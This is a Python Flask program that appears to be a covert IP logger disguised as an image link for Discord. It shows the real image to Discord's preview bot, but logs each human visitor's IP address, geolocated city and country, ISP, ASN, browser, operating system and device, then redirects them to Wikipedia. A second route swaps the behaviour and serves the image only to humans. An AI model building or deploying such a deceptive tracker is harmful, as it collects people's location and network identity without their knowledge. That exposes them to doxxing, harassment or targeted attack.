
from flask import Flask, request, send_file, redirect
from werkzeug.middleware.proxy_fix import ProxyFix
from user_agents import parse
from ipaddress import ip_address
import requests
import logging
import os
import sys

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    stream=sys.stdout,
    force=True
)

app.logger.setLevel(logging.INFO)

GEO_API = "http://ip-api.com/json/"
GEO_FIELDS = "status,country,city,isp,as,query"


def get_client_ip():
    candidate = request.remote_addr or ""

    try:
        parsed = ip_address(candidate)
        if parsed.is_global:
            return str(parsed)
    except ValueError:
        pass

    return "Unknown"


def get_ip_info(ip):
    unavailable = {
        "country": "Unavailable",
        "city": "Unavailable",
        "isp": "Unavailable",
        "asn": "Unavailable"
    }

    try:
        parsed_ip = ip_address(ip)

        if not parsed_ip.is_global:
            return unavailable

        response = requests.get(
            f"{GEO_API}{ip}",
            params={"fields": GEO_FIELDS},
            timeout=5
        )
        response.raise_for_status()
        data = response.json()

        if data.get("status") != "success":
            app.logger.warning("[GEO] Lookup failed: %s", data.get("message", "Unknown error"))
            return unavailable

        return {
            "country": data.get("country") or "Unknown",
            "city": data.get("city") or "Unknown",
            "isp": data.get("isp") or "Unknown",
            "asn": data.get("as") or "Unknown"
        }

    except (requests.RequestException, ValueError) as exc:
        app.logger.warning("[GEO] Lookup error: %s", exc)
        return unavailable


def log_request(is_discord=False):
    ip = get_client_ip()
    info = get_ip_info(ip)

    if is_discord:
        app.logger.info("[LOG] Discord Bot Detected (browser details not applicable)")
    else:
        ua_string = request.headers.get("User-Agent", "")
        ua = parse(ua_string)

        browser = ua.browser.family or "Unknown"
        browser_version = ua.browser.version_string
        if browser_version:
            browser = f"{browser} {browser_version}"

        if ua.is_mobile:
            device = "Mobile"
        elif ua.is_tablet:
            device = "Tablet"
        elif ua.is_pc:
            device = "Desktop"
        else:
            device = "Unknown"

        os_name = ua.os.family or "Unknown"
        os_version = ua.os.version_string

        if os_name == "Windows":
            os_name = "Windows (exact version not reliably identifiable from User-Agent)"
        elif os_version:
            os_name = f"{os_name} {os_version}"

        app.logger.info(
            "[LOG] User Browser Detected "
            "(Browser: %s | OS: %s | Device: %s)",
            browser,
            os_name,
            device
        )

    app.logger.info(" IP: %s", ip)
    app.logger.info(" Country/City: %s / %s", info["country"], info["city"])
    app.logger.info(" ISP: %s", info["isp"])
    app.logger.info(" ASN: %s", info["asn"])


def is_uptime_robot():
    return "UptimeRobot" in request.headers.get("User-Agent", "")


@app.route("/")
def home():
    return "OK", 200


@app.route("/image.png")
def conditional_serve():
    if is_uptime_robot():
        return "OK", 200

    user_agent = request.headers.get("User-Agent", "")

    if "Discordbot" in user_agent:
        log_request(is_discord=True)
        return send_file("actual_image.png", mimetype="image/png")

    log_request()
    return redirect("https://wikipedia.org")


@app.route("/image2.png")
def separate_log_behavior():
    if is_uptime_robot():
        return "OK", 200

    user_agent = request.headers.get("User-Agent", "")

    if "Discordbot" in user_agent:
        log_request(is_discord=True)
        return "<html><body></body></html>", 200

    log_request()
    return send_file("actual_image2.png", mimetype="image/png")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
